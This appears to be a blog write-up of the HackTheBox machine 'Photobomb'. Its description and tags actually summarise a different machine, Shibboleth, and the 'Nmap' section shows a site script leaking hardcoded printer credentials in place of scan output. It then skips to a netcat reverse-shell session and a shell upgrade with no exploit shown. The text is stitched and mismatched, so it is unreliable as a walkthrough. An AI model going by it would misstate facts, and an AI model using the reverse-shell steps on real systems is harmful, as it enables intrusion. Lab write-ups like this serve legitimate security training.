---
layout: post
title: "HTB: PHOTOBOMB (10.10.11.182)"
description: "Shibboleth is a medium machine from HackTheBox created by knightmare & mrb3n. It starts off with a static website template. We will find a clue to look into BMC automation then find IPMI listening on UDP port 632. I will use Metasploit to leak a hash from IPMI, and crack it to get creds. This creds will allow me to log into Zabbix instance. Once in Zabbix i will use the Zabbix agent to execute commands and gain initial foothold. I will use credential reuse to pivots the next user. To get root, I’ll exploit a CVE in MariaDB / MySQL."
tags: [hackthebox, htb, linux, snmp, zabbix, command execution, access control lists, shibboleth, nmap, gobuster, ipimi-svc, mysql, password reuse, CVE-2021-27928,port 623,monitoring]
image: "/assets/img/photobomb/photobomb_feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We run NMAP with default scripts and enumerate version and save it in the directory called nmap.

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
And we get a shell on the box. While we are at it we can upgrade out shell to a better one

```sh
┌─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.182] 43228
bash: cannot set terminal process group (697): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 

wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌─[✗]─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $stty raw -echo;fg
nc -lvnp 9001

wizard@photobomb:~/photobomb$
```
